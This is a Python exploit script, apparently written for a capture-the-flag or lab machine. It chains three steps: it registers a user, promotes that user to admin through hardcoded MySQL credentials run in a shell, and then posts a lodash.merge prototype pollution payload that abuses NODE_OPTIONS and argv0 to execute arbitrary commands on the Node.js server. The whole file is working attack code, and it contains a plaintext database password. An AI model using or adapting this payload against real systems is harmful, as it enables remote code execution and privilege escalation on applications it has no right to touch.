#!/usr/bin/env python3

"""
Author: poorduck
Date: 2023-05-02
Description: Blind command injection using lodash.merge prototype pollution

Usage: python script.py [COMMAND]
                        - Where COMMAND is a system to execute in the target system

Example: python script.py 'ping -c2 10.10.14.46'
"""

import requests
import json
import subprocess
import sys

session = requests.Session()
host = "http://127.0.0.1:3000"
username = "poorduck"
password = "p00rduck"


def register_user(url, user, password):
    resp = session.post(f"{url}/auth/register", json={"username": user, "password": password})
    status = json.loads(resp.text)["Status"]
    print("[+] Register status:", status)
    if "This user already exists" or "Ok" in status:
        return True
    else:
        return False

def update_user_role(user):
    print("... updating User role")
    cmd = f"mysql -u webapp_user -pStr0ngP4ssw0rdB*12@1 -e \"USE pollution_api; UPDATE users SET role = 'admin' WHERE username = '{user}';\""
    subprocess.run(cmd, shell=True)

    cmd = f"mysql -u webapp_user -pStr0ngP4ssw0rdB*12@1 -e \"SELECT role FROM pollution_api.users WHERE username = '{user}'\""
    is_admin = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE)
    if 'admin' in is_admin.stdout.decode():
        return True
    else:
        return False

def admin_token(url, user, password):
    resp = session.post(f"{url}/auth/login", json={"username": user, "password": password})
    status = json.loads(resp.text)
    print("[+] Login status:", status["Status"])
    if status["Status"] == "Ok":
        return status["Header"]
    else:
        return False

def pollute_it(url, cmd):
    carbon_dioxide = {"text": {"constructor": {"prototype": {"shell":"/proc/self/exe", "NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": f"console.log(require(\"child_process\").execSync(\"{cmd}\").toString())//"}}}}
    resp = session.post(f"{url}/admin/messages/send", json=carbon_dioxide)
    status = json.loads(resp.text)["Status"]
    print("[+] Pollution status:", status)
    if status == "Ok":
        return True
    else:
        exit("[-] Unable to pollute!")


if __name__ == "__main__":
    try:

        cmd = sys.argv[1]
        admin_header = {}
        is_registered = register_user(url=host, user=username, password=password)
        if is_registered:
            is_admin = update_user_role(user=username)
            if is_admin:
                is_login = admin_token(url=host, user=username, password=password)
                if is_login:
                    admin_header = is_login
                else:
                    exit(1)
            else:
                exit(1)
        else:
            exit(1)

        session.headers = admin_header
        pollute_it(url=host, cmd=cmd)
    
    except KeyboardInterrupt as e:
        print(e)
    except IndexError as e:
        exit("Usage: script.py <command>")
    except Exception as e:
        print(e)
